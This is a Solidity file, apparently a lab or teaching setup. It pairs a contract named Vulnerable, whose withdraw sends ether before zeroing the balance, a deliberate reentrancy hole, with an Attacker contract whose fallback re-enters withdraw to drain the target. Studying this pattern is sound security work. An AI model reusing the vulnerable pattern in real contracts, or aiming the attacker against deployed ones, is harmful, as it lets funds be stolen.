// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// solc -o . --bin --bin-runtime setup.sol --overwrite --optimize --optimize-runs 10000

contract Vulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        require(msg.value >= 1 ether, "deposit too small");
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance >= 1 ether, "withdraw too small");

        (bool ok, ) = msg.sender.call{value: balance}("");
        require(ok, "withdraw failed");

        balances[msg.sender] = 0;
        // unchecked { balances[msg.sender] -= balance; }
    }
}

contract Attacker {
    address private target;
    uint256 private limit;

    function attack(address _target) public payable {
        target = _target;
        limit = msg.value;

        Vulnerable vulnerable = Vulnerable(target);
        vulnerable.deposit{value: limit}();
        vulnerable.withdraw();
    }

    fallback() external payable {
        if(address(target).balance >= limit){
            Vulnerable(target).withdraw();
        }
    }

    // receive() external payable {}
}